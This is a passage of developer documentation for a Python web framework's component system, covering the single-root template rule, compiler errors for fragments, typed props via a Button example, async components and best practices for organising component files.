This is not just style guidance. The installed compiler injects `pp-component` onto the final root element, and it raises `TemplateRootError` when a component template has no root at all, or when its only root is an unresolvable tag. Sibling roots (including a sibling script after the root, or stray top-level text) produce a fragment boundary instead, and the component then cannot take props: any attribute on its `<x-*>` tag raises `FragmentPropsError`.

Route and layout templates — the markup returned from `page()` via `html(...)` and the template string returned from `layout()` — follow the same shape by default but are **not** held to it: when a page or layout has sibling top-level nodes, the compiler wraps them in a `display: contents` boundary host. See [routing.md](./routing.md) and [pulsepoint.md](./pulsepoint.md) "Multi-root pages and layouts".

When a component's authored root *is* another `x-*` tag, the compiler gives it the same layout-neutral host so it owns a boundary of its own, and forwards the parent's `x-*` attributes onto that host so they resolve as this component's `pp.props`. That extra `display: contents` div in rendered DOM is expected output.

For AI-generated templates, default to one parent node with the script inside it, exactly as a React component usually returns one parent — and reach for the fragment shape only when the siblings are genuinely siblings (most often `<tr>` rows or `<option>`s that cannot take a wrapper). The React analogy covers the *number of roots*, nothing about the syntax inside them: the body is plain HTML, not JSX.

Failure shape to avoid:

- one root element followed by a sibling `<script>`
- two top-level sibling elements
- top-level text outside the root
- an imported `x-*` root that expands to multiple native siblings

Good:

```html
<div class="card">
  <h2>Title</h2>

  <script>
    const [open, setOpen] = pp.state(false);
  </script>
</div>
```

Bad:

```html
<div class="card">
  <h2>Title</h2>
</div>

<script>
  const [open, setOpen] = pp.state(false);
</script>
```

Also bad:

```html
<h2>Title</h2>
<p>Body</p>
```

Also bad:

```html
<x-card>
  <h2>Title</h2>
</x-card>

<script>
  const [open, setOpen] = pp.state(false);
</script>
```

If you choose an imported `x-*` component as the authored root of the file, make sure it resolves to one native HTML root when compiled. Do not leave an unresolved component tag as the root, and do not emit multiple top-level component siblings.

## Props, Types, And Children

Props come from the attributes on the component tag.

```python
from typing import Any, Literal

from casp.component_decorator import component
from casp.html_attrs import get_attributes, merge_classes

ButtonVariant = Literal["default", "outline", "destructive"]

@component
def Button(
    children: Any = "",
    variant: ButtonVariant = "default",
    **props,
) -> str:
    classes = {
        "default": "btn btn-primary",
        "outline": "btn btn-outline",
        "destructive": "btn btn-danger",
    }

    incoming_class = props.pop("class", "")
    attrs = get_attributes({
        "class": merge_classes(classes[variant], incoming_class),
    }, props)

    return f'<button {attrs}>{children}</button>'
```

Use typed parameters when you want better editor hints and stricter component APIs. `Literal[...]` is a good fit for variants, sizes, or other closed sets of values.

## Async Components

Components can also be async. Use this only when the component render contract really depends on awaited work such as a database query, service call, or file read.

```python
from casp.component_decorator import component, html

@component
async def ProfileCard(user_id: str) -> str:
    user = await get_user_by_id(user_id)

    return html("""
      <div class="profile-card">
        <h3>{{ user.name }}</h3>
        <p>{{ user.email }}</p>
      </div>
    """, user=user)
```

Keep synchronous components as the default. Switch to `async def` only when the component itself needs awaited I/O.

## Best Practices

- Put reusable components in `src/components/` and keep route files in `src/app/`.
- For dashboards, admin areas, account sections, and route groups with child routes, put the shared shell in the parent folder's `layout.py` and compose it from reusable components there instead of repeating the same shell in every child route.
- Every component is a single Python file with inline `html(...)`, including ones with PulsePoint behavior.
- Split by responsibility when a component grows. If a component is large because it contains several independent sections, tabs, tables, forms, or workflows, create smaller components and compose them.
- Resolve child `x-*` tags with real Python imports at the top of the `.py` module.
- For component clicks, inputs, menus, toggles, filters, and list updates, use PulsePoint events and directives inside the component template. Avoid manual DOM selection, manual listener setup, and manual `innerHTML` rendering unless integrating a third-party imperative widget.
- Keep the component file name, exported function name, and authored tag aligned, such as `Button.py`, `def Button(...)`, and `<x-button />`.
- Accept `children` or `**props` when the component should support nested content.
- Keep page-level data loading in `page()` when the data is not intrinsic to the component itself.
- If you add `@rpc()` functions inside a component file, keep their names globally unique because component RPCs are not route-scoped.

## Related Reading

- Read [project-structure.md](./project-structure.md) for where reusable components should live.
- Read [routing.md](./routing.md) when importing components into route templates.
- Read [pulsepoint.md](./pulsepoint.md) for the runtime contract of `pp-component`, plain owned scripts, props, and browser-side reactivity.
- Read [fetch-data.md](./fetch-data.md) when a component needs browser-triggered `pp.rpc()` calls or component-owned server actions.
